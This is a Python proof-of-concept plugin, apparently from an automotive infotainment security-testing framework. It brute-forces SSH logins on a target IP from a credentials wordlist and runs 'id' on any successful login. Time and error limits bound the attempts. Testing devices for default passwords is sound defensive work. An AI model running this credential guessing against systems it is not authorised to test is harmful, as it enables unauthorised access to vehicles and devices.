"""
PoC Name: SSH Weak Credentials
CVE: N/A
Component: Network Stack
Category: Network
Severity: High
CVSS: 8.0
Description: 车机SSH服务弱口令检测(12组常见默认密码)
Prerequisites: 目标SSH端口(22)开放, 需要paramiko库。
Usage: python3 11_SSH_Weak_Creds.py <target_ip>
"""
import socket
import sys
import time
import os
from iv_plugin_base import IVIVulnerabilityPlugin


def _resolve_credentials_path():
    candidates = []
    configured_dir = os.environ.get("AUTOSEC_POC_WORDLIST_DIR")
    if configured_dir:
        candidates.append(os.path.join(configured_dir, "credentials.txt"))
    candidates.extend([
        os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'pocs', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'wordlists', 'credentials.txt'),
    ])
    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            return candidate
    return candidates[0] if candidates else "credentials.txt"


class SSHWeakCredsPlugin(IVIVulnerabilityPlugin):
    meta_poc_name = "SSH Weak Creds"
    meta_cve_id = "N/A"
    meta_severity = "Medium"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def exploit(self):
        port = 22
        self.logger.info(f"检测SSH弱口令 {self.target_ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("SSH端口22关闭")
                self.results["vulnerable"] = False
                s.close()
                return self.results
            s.close()
        except:
            self.results["vulnerable"] = False
            return self.results

        # 2. 加载字典
        wordlist_path = _resolve_credentials_path()
        if not os.path.exists(wordlist_path):
            self.logger.error("未找到字典文件 credentials.txt")
            return self.results

        try:
            import paramiko
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                credentials = [line.strip().split(':', 1) for line in f if ':' in line]
                
            self.logger.info(f"加载了 {len(credentials)} 组凭据，开始测试...")
            
            start_scan_time = time.time()
            consecutive_errors = 0
            for user, passwd in credentials:
                # 检查时长是否超过2分钟
                if time.time() - start_scan_time > 120:
                    self.logger.warning("SSH字典测试超时 (2分钟限制), 自动终止。")
                    break

                client = None
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # 尝试连接
                    client.connect(self.target_ip, port=port, username=user, 
                                 password=passwd, timeout=3, banner_timeout=5)
                    
                    # 登录成功
                    self.logger.warning(f"[+] 发现SSH弱口令: {user} / {passwd}")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"SSH login successful with {user}:{passwd}"
                    
                    # 验证权限
                    _, stdout, _ = client.exec_command("id")
                    self.logger.info(f"    权限信息: {stdout.read().decode().strip()}")
                    
                    client.close()
                    return self.results
                    
                except paramiko.AuthenticationException:
                    # 密码错误，重置错误项，继续下一个
                    consecutive_errors = 0
                    if client: client.close()
                    continue
                except (ConnectionRefusedError, socket.gaierror):
                    # 明确的拒绝连接或地址错误，直接中断
                    self.logger.error(f"连接被拒绝或主机不可达，中断扫描。")
                    if client: client.close()
                    break
                except (paramiko.SSHException, ConnectionError, socket.error) as e:
                    # 连接重置、超时、Banner错误等，记录并累计错误
                    consecutive_errors += 1
                    self.logger.debug(f"测试 {user}:{passwd} 遇到连接问题 ({consecutive_errors}/3): {str(e)[:50]}")
                    if client: client.close()
                    
                    if consecutive_errors >= 3:
                        self.logger.error("连续 3 次连接异常，可能触发了服务保护或服务已下线，中断测试。")
                        break
                        
                    # 遇到连接类错误，稍作休眠
                    time.sleep(1)
                    continue
                except Exception as e:
                    self.logger.error(f"测试 {user}:{passwd} 发生非预期异常: {e}")
                    if client: client.close()
                    break # 非预期异常，安全起见中断
                    
        except ImportError:
            self.logger.error("缺少 paramiko 库")
        except Exception as e:
            self.logger.error(f"扫描执行异常: {e}")

        self.logger.info("测试结束，未发现弱口令。")
        self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 11_SSH_Weak_Creds.py <target_ip>")
        sys.exit(1)
    plugin = SSHWeakCredsPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
